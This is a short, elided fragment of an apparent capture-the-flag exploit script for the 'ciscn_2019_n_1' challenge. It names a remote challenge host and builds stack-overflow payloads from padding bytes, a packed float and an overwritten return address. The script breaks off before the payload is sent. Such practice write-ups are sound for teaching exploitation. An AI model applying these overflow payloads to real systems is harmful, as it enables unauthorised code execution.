...
target: str = './ciscn_2019_n_1'
target_host = ('redirect.do-not-trust.hacking.run', 10223)
...
# this problem can use following
# flag_addr = 0x04006BE
# payload = b'a' * (44+4)
# payload += b'a' * 8
# payload += p64(flag_addr)

# this is expected solution
data = struct.pack('<f', 11.28125)
payload = b'a' * 44
